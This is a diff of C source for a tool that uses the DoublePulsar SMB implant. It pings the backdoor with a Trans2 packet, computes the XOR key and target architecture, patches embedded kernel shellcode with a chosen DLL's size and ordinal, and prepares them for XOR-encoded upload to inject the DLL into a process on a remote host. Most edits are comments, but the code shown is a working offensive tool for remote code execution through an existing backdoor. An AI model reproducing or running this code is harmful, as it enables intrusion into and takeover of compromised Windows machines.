@@ -28,7 +28,7 @@ unsigned char SMB_TreeConnectAndX[] =
 
 unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";
 
-//Fixed Trans2 session setup PING packet.  This should work
+//Fixed SMB Trans2 session setup PING packet.  
 unsigned char trans2_request[] =
 "\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
@@ -37,7 +37,7 @@ unsigned char trans2_request[] =
 "\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00";
 
-//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
+//SMB Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
 unsigned char wannacry_Trans2_Request[] =
 "\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
@@ -295,6 +295,15 @@ unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
 		(((sig << 16) | sig & 0xFF00) << 8));
 }
 
+const char* calculate_doublepulsar_arch(uint64_t s) {
+	if ((s & 0xffffffff00000000) == 0) {
+		return "x86 (32-bit)";
+	}
+	else {
+		return "x64 (64-bit)";
+	}
+}
+
 void convert_name(char* out, char* name)
 {
 	unsigned long len;
@@ -401,7 +410,7 @@ int main(int argc, char* argv[])
 	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	//send Session Setup AndX request
+	//send SMB Session Setup AndX request
 	printf("sending Session_Setup_AndX_Request!\n");
 	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
@@ -441,46 +450,48 @@ int main(int argc, char* argv[])
 	//update UserID in modified TreeConnect Request
 	memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet
 
-	//send modified TreeConnect request
+	//send modified SMB TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	//copy the treeID from the TreeConnect response
 	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
 
-	//Update treeID, UserID
+	//Update treeID, UserID in the trans2 request
 	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
 	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
 	//might need to update processid
 
-	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
-	//will return x51 or 81
+	//if DoublePulsar is enabled, the multiplex ID is incremented by 10 and will return x51 or 81
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	unsigned char signature[6];
+	unsigned char signature[5];
 	unsigned int sig;
 	//copy SMB signature from recvbuff to local buffer
 	signature[0] = recvbuff[18];
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
-	signature[4] = recvbuff[22];
-	signature[5] = '\0';
-	//this is for determining architecture
-	//recvbuff[22];
-	//but unused at this time
+	//signature[4] = recvbuff[22];
+	signature[4] = '\0';
+	//value at this offset 22 in recvbuff[22] location in the recvbuff is for determining architecture but unused at this time
 
 	//convert the signature buffer to unsigned integer 
-	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
 	sig = LE2INT(signature);
 
 	//calculate the XOR key for DoublePulsar
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 
-	//choose your DLL  here
-	char filename[MAX_PATH] = "D:\\STRIKE\\artifact.dll";
+	//Extract 8 bytes from offset 18
+	uint64_t arch_signature_long = 0;
+	memcpy(&arch_signature_long, recvbuff + 18, 8);
+	const char* arch = calculate_doublepulsar_arch(arch_signature_long);
+	printf("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s\n", arch);
+
+	//choose your DLL here
+	char filename[MAX_PATH] = "artifact.dll";
 	printf("Loading file: %s\n", filename);
 	DWORD	dwFileSizeLow = NULL;
 	DWORD	dwFileSizeHigh = NULL;
@@ -498,7 +509,7 @@ int main(int argc, char* argv[])
 	dwFileSizeLow = GetFileSize(hFile, &dwFileSizeHigh);
 	printf("> File Size: %d bytes\n", dwFileSizeLow);
 
-	//alloc memory the size of of the DLL
+	//allocate memory the size of of the DLL
 	PBYTE pExeBuffer = new BYTE[dwFileSizeLow];
 
 	while (dwDummy)
@@ -511,24 +522,12 @@ int main(int argc, char* argv[])
 	CloseHandle(hFile);
 
 	printf("patching DLL + Userland shellcode size in Kernel shellcode...\n");
-	//printf("BEFORE:  ");
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 	*(DWORD*)&kernel_rundll_shellcode[2158] = dwFileSizeLow + 3978;
-	//printf("AFTER:  ");
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 
 	printf("patching DLL size...\n");
-	//printf("BEFORE:  ");
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF82] = dwFileSizeLow;
-	//printf("AFTER:  ");
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
 	printf("patching DLL ordinal...\n");
-	//printf("BEFORE:  ");
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
-	//printf("AFTER:  ");
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 
 	char process_name[256];
 	printf("Enter process name to inject DLL into (or press Enter to skip): ");
@@ -561,8 +560,8 @@ int main(int argc, char* argv[])
 			hexDump(NULL, (char*)&kernel_rundll_shellcode[0x862], 4);
 		}
 	}
-	
 
+	//calculate kernel shellcode size 
 	int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
 	kernel_shellcode_size -= 1;
 	printf("Kernel shellcode size:  %d\n", kernel_shellcode_size);
@@ -574,10 +573,11 @@ int main(int argc, char* argv[])
 	printf("will send %d packets\n ", numberofpackets);
 	printf("%d as a remainder\n", remainder);
 
+	//copy kernel shellcode and DLL to the buffer
 	memcpy(pFULLBUFFER, kernel_rundll_shellcode, 6144);
 	memcpy(pFULLBUFFER + 6144, pExeBuffer, dwFileSizeLow);
 
-	//unsigned int XorKey = 0x58581162;
+	//Sample XorKey used for testing -> unsigned int XorKey = 0x58581162;
 	unsigned char byte_xor_key[4];
 	byte_xor_key[0] = (unsigned char)XorKey;
 	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
